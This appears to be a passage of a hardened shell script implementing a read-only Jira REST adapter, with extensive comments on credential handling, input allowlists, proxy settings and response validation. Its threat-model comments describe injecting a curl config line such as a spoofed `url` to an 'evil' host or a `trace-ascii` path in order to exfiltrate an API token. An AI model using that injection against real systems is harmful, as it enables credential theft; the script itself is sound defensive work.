#!/bin/sh
# tracker-jira.sh — the Jira adapter (TBG-JIRA-READER, design
# docs/architecture/2026-09-19-tracker-backed-governance-design.md §6a S-3/S-4/S-7/S-8/S-11, T5,
# §4.6). The ONE jira-shaped code in the kit: Cloud REST v3 / Data Center REST v2 (branched on
# `flavour`), the single hardened jira-HTTP primitive (J2 — `scripts/tracker-read.sh` and the
# future TBG-BOARD-VERBS both dispatch through this file; no second curl-to-jira path).
#
# What it changes: read-only against Jira (no write verbs here — those are TBG-BOARD-VERBS).
# Emits a flat `key<TAB>value` record on stdout for `tracker-read.sh` to fold into the §4.3
# record. Never writes the §4.3 record itself (that is the neutral reader's job).
#
# Guardrails: (S-3/T5/J4 — the complete token-leak enumeration, one control) the credential
# reaches `curl` ONLY via a `-K` config fed on stdin — never argv (a shim recording "$@" proves
# it on every request path), never a disk file, never curl's env (`env -i` scrubs it). `curl -q`
# first; `--proto =https --globoff --max-redirs 0`; never `-L`; any 3xx -> UNVERIFIED; no `set -x`.
# `jq` absent -> UNVERIFIED naming jq. id<->project matched client-side BEFORE any request (S-4);
# the response key/project checked AFTER, refused with a FIXED sentence (never echoing tracker
# bytes — S-6/log-injection). Bodies built with `jq -n --arg` (S-8), written to a non-secret temp
# file and posted via curl's `data = "@file"` -K directive — the credential and the body are two
# separate -K lines, never concatenated. A `mypermissions` probe flags an over-privileged
# credential, and fails CLOSED (unparsable/error -> credential-unverified) (S-11). `status.id` and
# the response `key` are grammar-checked before any use or print (H-5). `jira_curl_authed` is the
# ONLY function in this file that ever calls curl — every op routes through it (B-1/J2: no second
# curl path). The credential is POSITIVELY allowlisted
# (`[A-Za-z0-9@._+/=:-]{1,512}`, no whitespace/control/quote/backslash) before it is ever placed
# in a `-K` config line — refusing a quote/backslash alone was insufficient (a newline or other
# control byte could inject a second `-K` directive, e.g. a spoofed `url =` or `trace-ascii =`
# line). `curl` itself is HARDCODED on every production path — `_TJ_CURL_BIN` is never read from
# the environment outside `--selftest`, which sets it as a plain shell variable in-process (H-1).
# `connect-timeout`/`max-time` bound every request; a bounded retry covers 5xx/transport failure,
# each exhausted attempt ending in UNVERIFIED, never a silent partial (T8/M-4).
#
# Usage (internal — called by tracker-read.sh, not a human CLI):
#   tracker-jira.sh get-issue <base_url> <flavour> <project> <id>
#   tracker-jira.sh permissions <base_url> <flavour> <project>
#   tracker-jira.sh required-fields <base_url> <flavour> <project> <issuetype>   (rc 3 type absent, 4 ambiguous, 2 unverified)
#   tracker-jira.sh transition-fields <base_url> <flavour> <issue-key>   (a card's transitions' required screen fields; GET-only)
#   tracker-jira.sh writable-create-keys                                      (no network: the closed create-key set)
#   tracker-jira.sh transition ...  rc 5 = the tracker refused (HTTP 400); stderr names the screen's required fields
#   tracker-jira.sh status-ids <base_url> <flavour> <project>
#   tracker-jira.sh list-in-states <base_url> <flavour> <project> <cap> <statusid>...
#   tracker-jira.sh contract-read <base_url> <flavour> status|field|myself|project <KEY>|project-statuses <KEY>|
#     project-workflows <projectId> <issueTypeId>...|probe|server-info|epic-model|perms <KEY>|visibility <KEY>
#     (internal: the preflight's reads; see tj_contract_read)
#   tracker-jira.sh --selftest
set -eu
# 0b: clear an ambient env var of this name at process start — `_tj_mktemp` below only ever honours
# a value `_tj_search_all` sets locally, never one inherited from the caller's environment.
unset _TJ_RUNDIR 2>/dev/null || true
# the same for the status-file hook `jira_curl_authed` honours (set only by `_tj_tr_post` below)
unset _TJ_STATUS_FILE 2>/dev/null || true
# and the route-file hook (set only by `_tj_cr_probe` below)
unset _TJ_VIA_FILE 2>/dev/null || true

# --- the ONE hardened jira-HTTP primitive (T1: S-3, T5, J2, J4, B-1, H-1, M-4) ------------------

# _TJ_CURL_BIN: HARDCODED. Never read from the environment on a production path (H-1) — a
# `--selftest` run reassigns this shell variable directly, in-process, never through the
# environment, so a caller cannot steer curl to an arbitrary binary outside --selftest.
_TJ_CURL_BIN=curl

# _tj_cred_ok <value>: the positive allowlist (B-1) — refuse anything OUTSIDE this charset rather
# than trying to enumerate every dangerous byte. A `-K` config line is `key = "value"`; a `"` or
# `\` terminates/escapes the quoted value early, and a bare newline/CR starts a NEW config
# directive on the next line (a `\n`-bearing token could inject `url = "https://evil/"` or
# `trace-ascii = "/path"`, exfiltrating the token or writing an arbitrary file). The allowlist is
# ASCII-only, no whitespace, no control bytes, no quote/backslash — real Jira emails/API tokens/PATs
# never need anything outside it.
_tj_cred_ok() {
  # spelled-out letter classes (no A-Z / a-z ranges: those admit accented letters under a UTF-8 locale);
  # the allowed set lives in a variable used unquoted as a pattern, so the match is on the bytes themselves
  _cr_set='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@._+/=:-'
  case "$1" in
    '') return 1 ;;
    *[!$_cr_set]*) return 1 ;;
    *) : ;;
  esac
  _l=${#1}
  [ "$_l" -le 512 ]
}

# _tj_mktemp <suffix>: T2c0 item 4 — mktemp, routed into the caller's own private run dir when one
# is set (`_TJ_RUNDIR`, a plain shell variable inherited by every downstream `$( … )` fork — no
# export needed). fix1 C4: COMMENT RE-FIXED (it had gone stale again) — every op now runs its body
# through `_tj_rundir_run` (T3b step 0b's get-issue/status-ids/label-counts/permissions/field-empty,
# T3b-core step 0's assign-self/transitions/transition/create), so no op falls back to the system
# default temp dir any more. 0b: unset at file scope above (:42), so an ambient env var of this name
# cannot steer an unwrapped call.
_tj_mktemp() {
  if [ -n "${_TJ_RUNDIR:-}" ]; then
    mktemp "$_TJ_RUNDIR/$1.XXXXXX" 2>/dev/null
  else
    mktemp 2>/dev/null
  fi
}

# _tj_rundir_run <fn> [args...]: T3b step 0b — the SAME private-run-dir + one-trap-at-the-op's-own-
# top-level pattern `_tj_search_all` uses (T2c0 item 4), generalised so every OTHER op gets it too.
# A temp `jira_curl_authed` creates OUTSIDE `_tj_search_all` (its own `_resp_tmp`/`_hdr_tmp` on
# get-issue/status-ids/permissions/the write paths, or `tj_label_counts`' own `_lc_buf`) used to
# fall back to the system default temp dir with no cleanup on a signal mid-call — a killed
# `get-issue` left assignee PII on disk. Runs `<fn> [args...]` inside a subshell carrying its OWN
# `_TJ_RUNDIR` + EXIT/INT/TERM traps (a subshell, not a bare `trap`, because a trap set directly
# here would overwrite whatever EXIT trap the CALLER already holds — `_tj_selftest` sets its own).
_tj_rundir_run() {
  _trr_fn=$1; shift
  (
    _TJ_RUNDIR=$(mktemp -d 2>/dev/null) || { echo "unverified: could not create a scratch file" >&2; exit 2; }
    trap '[ -n "$_TJ_RUNDIR" ] && rm -rf "$_TJ_RUNDIR" 2>/dev/null || true' EXIT
    trap 'exit 130' INT
    trap 'exit 143' TERM
    "$_trr_fn" "$@"
  )
  return $?
}

# _tj_jc_status_ok <hdrfile>: T2c0 item 2 (T2b1 seat L-3) — the response status line's field 2 is a
# tracker-controlled byte string `jira_curl_authed` interpolates into three sentences; gate it to
# EXACTLY three ASCII digits before any of them run. Prints the validated status on success; on any
# other shape prints the ONE fixed sentence on stderr and returns 2 — the raw value is never printed
# (S-6).
_tj_jc_status_ok() {
  _jso_status=$(awk 'NR==1{print $2}' "$1" 2>/dev/null || true)
  case "$_jso_status" in
    ''|*[!0-9]*) : ;;
    *) [ "${#_jso_status}" -eq 3 ] && { printf '%s' "$_jso_status"; return 0; } ;;
  esac
  echo "unverified: jira response status unparsable" >&2
  return 2
}

# _tj_proxy_ok <value> proxy|noproxy: the positive allowlist for a value about to be written into a `-K`
# `proxy = "…"` / `noproxy = "…"` line (the twin of `_tj_cred_ok`). A quote or backslash ends/escapes the
# quoted value early and a newline starts a NEW directive, so only the bytes a real proxy URL or no-proxy
# list needs are admitted. A proxy may also carry a scheme, but only http:// or https:// (or none).
_tj_proxy_ok() {
  # The value is matched against the allowed set AS WRITTEN: no external filter (tr, sed, awk) sits between
  # the check and the config line, because a filter that stops at an invalid byte would validate less than
  # is emitted. The set is a variable used unquoted as a pattern (so a space needs no quote or backslash);
  # letter classes are spelled out (A-Z / a-z ranges admit accented letters under a UTF-8 locale).
  _po_set='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789:/@._%+-'
  case "$2" in
    proxy)
      case "$1" in
        *[!$_po_set]*) return 1 ;;
      esac
      case "$1" in
        http://*|https://*) : ;;
        *://*) return 1 ;;
        *) : ;;
      esac ;;
    *)
      _po_set='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789:/@._%+,* -'
      case "$1" in
        *[!$_po_set]*) return 1 ;;
      esac ;;
  esac
  [ "${#1}" -le 512 ]
}

# _tj_proxy_lines: sets `_proxybit` to the optional `-K` lines for the environment's egress proxy, or to
# empty. curl's own precedence: `https_proxy` before `HTTPS_PROXY`, `no_proxy` before `NO_PROXY`. The value
# reaches curl ONLY through the stdin config — curl runs under `env -i`, so it is never in curl's
# environment or on argv (a proxy URL often carries user:password@). Each value is allowlisted first; a
# refused value is rc 1 with one fixed sentence (no caller bytes echoed) and NEVER falls back to a direct
# call. CA/TLS variables stay scrubbed on purpose: no cacert/capath/insecure line is ever written.
# `write-out` asks curl for %{http_connect} (non-zero = the tunnel was used) so the preflight can say so.
_tj_proxy_lines() {
  _proxybit=""
  _pl_has_proxy=""
  _pl_nl='
'
  _pl_proxy=${https_proxy:-${HTTPS_PROXY:-}}
  _pl_noproxy=${no_proxy:-${NO_PROXY:-}}
  if [ -n "$_pl_noproxy" ]; then
    _tj_proxy_ok "$_pl_noproxy" noproxy || { echo "refused: NO_PROXY carries a byte outside the allowed set (letters, digits, and : / @ . _ % + - , * space); nothing was sent" >&2; return 1; }
  fi
  if [ -n "$_pl_proxy" ]; then
    _tj_proxy_ok "$_pl_proxy" proxy || { echo "refused: HTTPS_PROXY is not a usable proxy URL (http:// or https://, letters, digits and : / @ . _ % + - only); nothing was sent" >&2; return 1; }
    _proxybit="proxy = \"$_pl_proxy\"$_pl_nl"'write-out = "%{http_connect}"'
    _pl_has_proxy=1
  fi
  if [ -n "$_pl_noproxy" ]; then
    _proxybit="$_proxybit${_proxybit:+$_pl_nl}noproxy = \"$_pl_noproxy\""
  fi
  return 0
}

# _tj_via_read <scratch-file or empty>: `direct` when no proxy was configured or curl made no CONNECT
# (%{http_connect} 000, e.g. NO_PROXY matched); `proxy` for any other 3-digit code; `unknown` when a proxy
# was configured but curl's answer is unreadable (never a guess).
_tj_via_read() {
  if [ -z "$1" ]; then printf 'direct'; return 0; fi
  _vr=$(cat "$1" 2>/dev/null || true)
  case "$_vr" in
    000) printf 'direct' ;;
    [0-9][0-9][0-9]) printf 'proxy' ;;
    *) printf 'unknown' ;;
  esac
}

# jira_curl_authed <method> <url> [bodyfile]: prints the response body on stdout. Auth via `-K -`
# fed a `user = "<user>:<token>"` (basic) or `header = "Authorization: Bearer <token>"` (bearer)
# line on STDIN — never on argv, never a temp file. <bodyfile>, if given, carries a non-secret
# JSON request body (S-8) and is referenced by a SEPARATE `data = "@<bodyfile>"` -K line — the
# credential and the body never share one interpolated string. Env scrubbed with `env -i`; a
# fixed, minimal PATH is carried through so `curl` itself still resolves. Any 3xx -> UNVERIFIED
# (rc 2), never followed (no -L, --max-redirs 0). http:// base is refused by the caller before
# this is reached (S-3); --proto =https here is defense in depth. Bounded retry (T8/M-4): up to
# two extra attempts on a transport failure or a 5xx status; exhausting the budget -> UNVERIFIED.
jira_curl_authed() {
  _method=$1; _url=$2; _bodyfile=${3:-}
  case "$_url" in
    https://*) : ;;
    *) echo "refused: jira adapter requires an https:// URL (got '$_url')" >&2; return 1 ;;
  esac
  # BLOCKER-1(b) — DEFENCE IN DEPTH: the whole URL is positively allowlisted before it ever
  # reaches the `-K` config's `url =` line, the twin of `_tj_cred_ok` below. Every caller already
  # grammar-checks its own interpolated pieces (id<->project via `_tj_id_ok`, a numeric status id,
  # a project key from the pinned conf) BEFORE building a URL, but this is the LAST LINE — a
  # newline or other control byte here would otherwise inject a second `-K` directive (a spoofed
  # `url =`, `trace-ascii =`, or `output =` line), exfiltrating the credential or writing an
  # arbitrary file. No whitespace, no control byte, no quote/backslash; refused with NO caller
  # bytes echoed (S-6).
  case "$_url" in
    *[!A-Za-z0-9:/?\&=._%,-]*)
      echo "refused: the request URL carries a byte outside the allowed charset" >&2
      return 1 ;;
  esac
  _auth_kind=${KIT_TRACKER_AUTH:-basic}
  case "$_auth_kind" in
    basic)
      _cfguser=${KIT_TRACKER_USER:-${JIRA_EMAIL:-}}
      _cfgtok=${KIT_TRACKER_TOKEN:-${JIRA_TOKEN:-}}
      _tj_cred_ok "$_cfguser" || { echo "refused: credential (user) outside the allowed charset" >&2; return 1; }
      _tj_cred_ok "$_cfgtok"  || { echo "refused: credential (token) outside the allowed charset" >&2; return 1; }
      _cfgline=$(printf 'user = "%s:%s"\n' "$_cfguser" "$_cfgtok") ;;
    bearer)
      _cfgtok=${KIT_TRACKER_TOKEN:-${JIRA_TOKEN:-}}
      _tj_cred_ok "$_cfgtok" || { echo "refused: credential (token) outside the allowed charset" >&2; return 1; }
      _cfgline=$(printf 'header = "Authorization: Bearer %s"\n' "$_cfgtok") ;;
    *) echo "refused: unknown auth kind '$_auth_kind'" >&2; return 1 ;;
  esac
  _databit=""
  [ -n "$_bodyfile" ] && _databit=$(printf 'header = "Content-Type: application/json"\ndata = "@%s"\n' "$_bodyfile")
  _tj_proxy_lines || return 1
  _attempt=0
  _maxattempts=3
  while [ "$_attempt" -lt "$_maxattempts" ]; do
    _attempt=$((_attempt + 1))
    _resp_tmp=$(_tj_mktemp resp) || { echo "unverified: could not create a scratch file" >&2; return 2; }
    _hdr_tmp=$(_tj_mktemp hdr) || { rm -f "$_resp_tmp"; echo "unverified: could not create a scratch file" >&2; return 2; }
    _conn_tmp=""
    if [ -n "$_pl_has_proxy" ]; then
      _conn_tmp=$(_tj_mktemp conn) || { rm -f "$_resp_tmp" "$_hdr_tmp"; echo "unverified: could not create a scratch file" >&2; return 2; }
    fi
    # N-1: each directive gets its OWN explicit `\n` at the join point (see the standalone note
    # below this function for the full history of why).
    _cfg_all=$(printf '%s\n%s\nrequest = "%s"\nurl = "%s"\nsilent\nshow-error\nproto = "=https"\ngloboff\nmax-redirs = 0\nconnect-timeout = 10\nmax-time = 30\n' \
      "$_cfgline" "$_databit" "$_method" "$_url")
    # the proxy lines (validated above) ride AFTER the fixed block: with none set, the config above is
    # byte-for-byte what it was before this row.
    [ -z "$_proxybit" ] || _cfg_all=$(printf '%s\n%s' "$_cfg_all" "$_proxybit")
    _rc=0
    # curl's stdout (the `write-out` of %{http_connect}, proxy case only) goes to a private scratch file.
    printf '%s' "$_cfg_all" | env -i PATH="/usr/bin:/bin:/usr/local/bin" \
      "$_TJ_CURL_BIN" -q -K - -D "$_hdr_tmp" -o "$_resp_tmp" >"${_conn_tmp:-/dev/null}" || _rc=$?
    _via=$(_tj_via_read "$_conn_tmp")
    [ -z "$_conn_tmp" ] || rm -f "$_conn_tmp"
    if [ "$_rc" -ne 0 ]; then
      rm -f "$_resp_tmp" "$_hdr_tmp"
      [ "$_attempt" -lt "$_maxattempts" ] && continue
      echo "unverified: curl exit $_rc after $_attempt attempt(s)" >&2
      return 2
    fi
    # the site answered: name the route for a caller that asked (the preflight), whatever the status
    [ -z "${_TJ_VIA_FILE:-}" ] || printf '%s' "$_via" > "$_TJ_VIA_FILE" 2>/dev/null || true
    _status=$(_tj_jc_status_ok "$_hdr_tmp") || { rm -f "$_resp_tmp" "$_hdr_tmp"; return 2; }
    case "$_status" in
      3??) rm -f "$_resp_tmp" "$_hdr_tmp"; echo "unverified: jira returned a redirect ($_status), not followed" >&2; return 2 ;;
      2??) : ;;
      429) rm -f "$_resp_tmp" "$_hdr_tmp"; echo "unverified: jira rate-limited (429)" >&2; return 2 ;;
      5??)
        rm -f "$_resp_tmp" "$_hdr_tmp"
        [ "$_attempt" -lt "$_maxattempts" ] && continue
        echo "unverified: jira returned status $_status after $_attempt attempt(s)" >&2; return 2 ;;
      *)
        rm -f "$_resp_tmp" "$_hdr_tmp"
        # a caller that must tell a 400 from any other refusal names a status file (`_TJ_STATUS_FILE`, a
        # script-set plain variable) — only the 3-digit gated status lands there, never the body (S-6)
        [ -z "${_TJ_STATUS_FILE:-}" ] || printf '%s' "$_status" > "$_TJ_STATUS_FILE" 2>/dev/null || true
        echo "unverified: jira returned status $_status" >&2; return 2 ;;
    esac
    { cat "$_resp_tmp"; } 2>/dev/null || { rm -f "$_resp_tmp" "$_hdr_tmp"; echo "unverified: could not deliver the jira response" >&2; return 2; }
    rm -f "$_resp_tmp" "$_hdr_tmp"
    return 0
  done
  echo "unverified: exhausted retry budget" >&2
  return 2
}

# Guards the _resp_tmp/_hdr_tmp mktemps and the delivery `cat` above: fail-closed, one sentence, no
# leak/raw diagnostic — via a caller's `$( … )` (oracle cases 'respmktemp'/'hdrmktemp'/'respdelivery')
# and directly, left of `||` (tj_assign_self's PUT / tj_transition's POST — 'directresp'/'directhdr').
# N-1: each directive gets its OWN explicit `\n` at the join point (`$(...)` strips only a fragment's
# own trailing newline, so an unseparated join could glue two directives onto one stdin line).

_tj_require_jq() {
  command -v jq >/dev/null 2>&1 || { echo "unverified: jq is required for the tracker arm (install jq)" >&2; return 2; }
}

# --- flavour -> REST base (S-9 carried) --------------------------------------------------------
_tj_rest_base() {
  case "$1" in
    datacenter) printf '/rest/api/2' ;;
    *) printf '/rest/api/3' ;;
  esac
}

# _tj_status_id_ok <value>: the closed grammar for a jira status id — digits only (H-5). Applied
# BEFORE the id is used in any query and BEFORE it is printed in any sentence.
_tj_status_id_ok() {
  case "$1" in
    ''|*[!0-9]*) return 1 ;;
  esac
  # T3ac step 0c (L-3): a length bound — Jira status ids are small integers; an unbounded digit
  # string is never a real one and only invites arithmetic on an attacker-sized number downstream.
  [ "${#1}" -le 10 ]
}

# _tj_project_ok <value>: the T2a project grammar (`^[A-Z][A-Z0-9_]*$`), defence in depth over
# tracker-conf.sh's own project check — checked BEFORE any request is built (invariant 5). M-3
# hardening shape (as tr_valid_id/_tj_id_ok use): a bracket class is ONE character, so the
# first-char check and the negated whole-string check are two separate case arms, not one glob.
# T2c0 item 6 (T2a seat L-1): `[A-Z]` ranges are locale-dependent under macOS `sh` — a project of
# "Ab" was wrongly ACCEPTED (rc 0) on `sh` under `LC_ALL=en_US.UTF-8`. Spelled-out letter classes
# collate the same everywhere.
_tj_project_ok() {
  case "$1" in
    [ABCDEFGHIJKLMNOPQRSTUVWXYZ]*) : ;;
    *) return 1 ;;
  esac
  case "$1" in
    *[!ABCDEFGHIJKLMNOPQRSTUVWXYZ0-9_]*) return 1 ;;
  esac
  return 0
}

# _tj_cap_ok <value>: the T2a cap grammar (`^[1-9][0-9]{0,4}$`, i.e. 1..99999) — a positive
# allowlist over an arbitrary page-cap/list-cap argument (not yet wired into any op this task;
# T2b/T2c consume it). Same M-3-hardened two-arm shape as _tj_project_ok/_tj_status_id_ok.
_tj_cap_ok() {
  case "$1" in
    [1-9]*) : ;;
    *) return 1 ;;
  esac
  case "$1" in
    *[!0-9]*) return 1 ;;
  esac
  _l=${#1}
  [ "$_l" -le 5 ]
}

# _tj_gi_assignee_present <body>: T3ac legs 1/4 — assignee is null or an object, never assumed
# (invariant 3, function-size ceiling extraction from tj_get_issue). Prints "true"/"false" on
# success; nothing on a malformed shape (return 2) — only this boolean ever leaves the function,
# never an accountId/displayName/emailAddress byte from the raw object (T3ac leg 3).
_tj_gi_assignee_present() {
  # T3ac-fix1 B2 (quality F1): a MISSING assignee key is not "unassigned" — `has` must be checked
  # explicitly, since a plain `.fields.assignee == null` is also true when the key never existed.
  _gap_ok=$(printf '%s' "$1" | jq -r \
    'if (.fields|has("assignee")) and (.fields.assignee == null or (.fields.assignee|type) == "object") then "ok" else "no" end' 2>/dev/null) || return 2
  [ "$_gap_ok" = "ok" ] || return 2
  printf '%s' "$1" | jq -r 'if .fields.assignee == null then "false" else "true" end' 2>/dev/null
}

# --- T2/T3: get-issue — S-4 id<->project match, H-5 status-id grammar, sanitised refusals -------
tj_get_issue() {
  _base=$1; _flavour=$2; _project=$3; _id=$4
  # S-4: client-side id<->project match BEFORE any request. T3ac step 0a (L-1): shared with every
  # other caller via _tj_id_ok, closing the AB-07 leading-zero differential the inline copy missed.
  _tj_id_ok "$_project" "$_id" || { echo "refused: id does not match project (grammar)" >&2; return 1; }
  _tj_require_jq || return $?
  # T3b step 0b: the request itself runs inside `_tj_rundir_run`'s own private run dir, so a
  # signal mid-call cleans up `jira_curl_authed`'s _resp_tmp/_hdr_tmp instead of leaking them.
  _tj_rundir_run _tj_gi_body "$_base" "$_flavour" "$_project" "$_id"
}

_tj_gi_body() {
  _base=$1; _flavour=$2; _project=$3; _id=$4
  _rb=$(_tj_rest_base "$_flavour")
  _body=$(jira_curl_authed GET "$_base$_rb/issue/$_id?fields=status,project,assignee") || return $?
  _key=$(printf '%s' "$_body" | jq -r '.key // empty' 2>/dev/null || true)
  _rproj=$(printf '%s' "$_body" | jq -r '.fields.project.key // empty' 2>/dev/null || true)
  # S-4 (after): response key + project must equal the request. FIXED sentence (H-5/S-6): never
  # echo the response's own bytes back — a hostile key/project could carry a control byte or a
  # crafted string that lands verbatim in a log (log injection).
  if [ "$_key" != "$_id" ] || [ "$_rproj" != "$_project" ]; then
    echo "refused: jira response key/project did not match the request" >&2
    return 1
  fi
  # M-3: grammar-check the response key too, even though it already equals a grammar-checked $_id
  # (defence in depth — a future caller of this function alone, without the S-4 equality check,
  # must not be able to smuggle a hostile key through).
  # M-3 hardening: a bracket-class match is ONE character; the trailing `*` is an independent
  # wildcard, not "repeat this class" — the check must ALSO negate the whole string, or a hostile
  # byte after the first two characters passes silently (found building this fix; see
  # tracker-read.sh's tr_valid_id for the same defect and a longer note).
  case "$_key" in
    [A-Z0-9]*) : ;;
    *) echo "refused: jira response key failed the id grammar" >&2; return 1 ;;
  esac
  case "$_key" in
    *[!A-Z0-9-]*) echo "refused: jira response key failed the id grammar" >&2; return 1 ;;
  esac
  _statusid=$(printf '%s' "$_body" | jq -r '.fields.status.id // empty' 2>/dev/null || true)
  # H-5: grammar-check status.id BEFORE any use or print.
  if ! _tj_status_id_ok "$_statusid"; then
    echo "unverified: jira response status id failed grammar" >&2
    return 2
  fi
  # M-2: also emit the tracker's own status NAME — the neutral reader resolves it to a §4.1 token
  # through the PINNED CONF's own state.* map (never through an environment variable).
  _statusname=$(printf '%s' "$_body" | jq -r '.fields.status.name // empty' 2>/dev/null || true)
  # T3ac legs 1/4: only the assignee-present boolean ever leaves _tj_gi_assignee_present.
  _assigneepresent=$(_tj_gi_assignee_present "$_body") \
    || { echo "unverified: jira response assignee field failed the expected shape" >&2; return 2; }
  printf 'key\t%s\n' "$_key"
  printf 'status-id\t%s\n' "$_statusid"
  printf 'status-name\t%s\n' "$_statusname"
  printf 'assignee-present\t%s\n' "$_assigneepresent"
  return 0
}

# _tj_sa_build_body <flavour> <jql> <max> <fields-json> <cursor>: the search request body, built
# with jq -n --arg/--argjson (S-8) — never string-interpolated. Cloud's per-page delta is a
# `nextPageToken` string carried in the BODY, never the URL (invariant 4 / F-12d); Data Center has
# no such token — its per-page delta is `startAt` (an integer, via `--argjson`, DC request shape
# per the brief: `POST /rest/api/2/search` with `{jql, startAt, maxResults, fields}`, no token) —
# ALWAYS present (including the first page's `startAt:0`), never omitted the way Cloud omits an
# absent token.
_tj_sa_build_body() {
  _sab_flavour=$1; _sab_jql=$2; _sab_max=$3; _sab_fields=$4; _sab_cursor=${5:-}
  if [ "$_sab_flavour" = "datacenter" ]; then
    jq -n --arg jql "$_sab_jql" --argjson max "$_sab_max" --argjson fields "$_sab_fields" \
      --argjson startat "$_sab_cursor" '{jql:$jql,startAt:$startat,maxResults:$max,fields:$fields}'
  elif [ -n "$_sab_cursor" ]; then
    jq -n --arg jql "$_sab_jql" --argjson max "$_sab_max" --argjson fields "$_sab_fields" \
      --arg tok "$_sab_cursor" '{jql:$jql,maxResults:$max,fields:$fields,nextPageToken:$tok}'
  else
    jq -n --arg jql "$_sab_jql" --argjson max "$_sab_max" --argjson fields "$_sab_fields" \
      '{jql:$jql,maxResults:$max,fields:$fields}'
  fi
}

# _tj_sa_validate_keys <body> <project>: invariant 1 (checked == emitted) and S-4 — for every
# issue whose `key` FIELD IS PRESENT (has("key") — an issue missing the field entirely is left
# for the caller's length check, invariant 3/F-5, to catch; the per-key check here must never be
# what catches THAT case), the key is captured via `$(...)` (which silently strips a trailing
# newline), grammar-checked with `_tj_id_ok "$project"`, and then RE-ASSERTED equal to the raw
# object's own `.key` — a value a `$(...)` capture silently truncated fails this re-assertion
# even though the truncated value alone would have passed grammar. Prints one validated, raw
# compact object per line on success; nothing at all once the first invalid key is hit (return 1).
_tj_sa_validate_keys() {
  _svk_body=$1; _svk_project=$2
  _svk_len=$(printf '%s' "$_svk_body" | jq '.issues | length' 2>/dev/null) || return 1
  _svk_cand=$(printf '%s' "$_svk_body" | jq -c '.issues[] | select(has("key"))' 2>/dev/null)
  # The IFS save/restore below is deliberate (word-splitting on a controlled newline delimiter,
  # restored on every exit path); every restore path is mutant-tested — see the review record.
  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  _svk_oldifs=$IFS; IFS='
'
  set -f
  _svk_n=0
  for _svk_obj in $_svk_cand; do
    [ -n "$_svk_obj" ] || continue
    _svk_n=$((_svk_n + 1))
    _svk_key=$(printf '%s' "$_svk_obj" | jq -r '.key' 2>/dev/null)
    if ! _tj_id_ok "$_svk_project" "$_svk_key"; then set +f; IFS="$_svk_oldifs"; return 1; fi  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
    # T2c leg 1: the leading-zero refusal moved into the shared `_tj_id_ok` above (called just
    # above this) — no local special case needed here any more.
    if ! printf '%s' "$_svk_obj" | jq -e --arg k "$_svk_key" '.key == $k' >/dev/null 2>&1; then
      set +f; IFS="$_svk_oldifs"; return 1  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
    fi
    printf '%s\n' "$_svk_obj"
  done
  set +f
  IFS="$_svk_oldifs"  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  # F-5: `.issues|length` must equal the count of key-bearing candidates — an issue with NO
  # `key` field at all was dropped by `select(has("key"))` above, silently, unless this length
  # check catches the shortfall (invariant 3: a null/dropped key never silently shortens a list).
  [ "$_svk_n" -eq "$_svk_len" ] || return 1
  return 0
}

# _tj_sa_shape_ok <body>: invariant 3 — every response shape is asserted, never assumed. `-e -s`
# (fix1 I-2) SLURPS the body into a one-element array first, so the verdict is over the WHOLE
# string, not just the last of several concatenated JSON documents (a two-document body now fails
# here, at `length==1`, instead of leaking past shape into the per-key path with the wrong rc). A
# missing/non-array `.issues` (absent, an object, a string, …) fails; so does an `.issues` array
# whose elements are not ALL objects (numbers/strings/nulls) — every later read in this file
# operates on an already-shape-validated single document, so `select(has("key"))` downstream can
# no longer hit a non-object element and raise a raw `jq: error` onto stderr. A well-formed empty
# array passes it.
_tj_sa_shape_ok() {
  printf '%s' "$1" | jq -e -s \
    'length == 1 and (.[0] | (.issues|type) == "array" and all(.issues[]; type == "object"))' \
    >/dev/null 2>&1
}

# _tj_sa_page_status_dc <body> <requested-startat>: T2b2 — Data Center invariant 4 completeness.
# DC's `/search` carries NO `isLast`; completeness is `<requested-startat> + len(issues) >=
# total`, using the CALLER's OWN requested `startAt` — NEVER the response body's own `.startAt`
# field. A misbehaving/hostile server could claim any `startAt` it likes (the brief's leg 3: a
# response lying "startAt": 99 on page 1) — trusting it could make a truncated read look complete.
# `total` ABSENT -> refused (cannot prove completeness, same fail-closed rule as Cloud's absent
# `isLast`). `total`/`.issues|length` are grammar-checked (digits, length-bounded) before any
# arithmetic. Prints `done` or `next:<new-startat>` on success (the CALLER'S arithmetic, not the
# server's); nothing on refusal (return 1), so `_tj_sa_one_page` issues the ONE fixed sentence and
# no further request.
# T2b2 fix1 m-1: `total` is now typed-checked in jq BEFORE ever being captured through `jq -r`
# (which stringifies a JSON STRING "5" and the NUMBER 5 identically — a `"5"` impersonating a
# number used to pass the old digits-only shell `case` check unnoticed and drive real arithmetic).
# `(.total|type)=="number" and .total >= 0 and .total == (.total|floor)` requires a genuine
# non-negative JSON integer; a JSON string, null, negative, or fractional value all refuse here.
# T2b2 fix2 S-M1/Q-m2: that predicate alone still accepted odd but INTEGER-VALUED numeric forms —
# `5.0`, `1e100`, `99999999999999999999` — which stringify via a bare `jq -r '.total'` as `5.0`,
# `1E+100`, or the literal 20-digit token, all of which then CRASH the shell `[` builtin further
# down ("Illegal number"/"integer expression expected" on dash/sh — a raw diagnostic that could
# carry tracker-controlled bytes, S-6). Fixed with THREE layers: (1) `<= 9007199254740991` (2^53-1,
# the largest integer a JSON number can carry without precision loss) is now PART of the typed
# check, so an out-of-range magnitude never reaches extraction at all; (2) within that bound the
# value is extracted via `.total|floor|tostring`, which jq itself normalizes to a plain decimal
# digit string (no trailing `.0`, no scientific notation) for any in-range integer; (3) the
# extracted string is STILL digit-gated and length-bounded (defence in depth — never trust a single
# layer to hold forever) before it is ever handed to `[`.
_tj_sa_page_status_dc() {
  _spsd_body=$1; _spsd_reqstart=$2
  case "$_spsd_reqstart" in
    ''|*[!0-9]*) return 1 ;;
  esac
  _spsd_totalok=$(printf '%s' "$_spsd_body" | jq -r \
    'if has("total") and (.total|type) == "number" and .total >= 0 and .total == (.total|floor)
        and .total <= 9007199254740991
     then "ok" else "no" end' 2>/dev/null) || return 1
  [ "$_spsd_totalok" = "ok" ] || return 1
  _spsd_total=$(printf '%s' "$_spsd_body" | jq -r '.total|floor|tostring' 2>/dev/null) || return 1
  case "$_spsd_total" in
    ''|*[!0-9]*) return 1 ;;
  esac
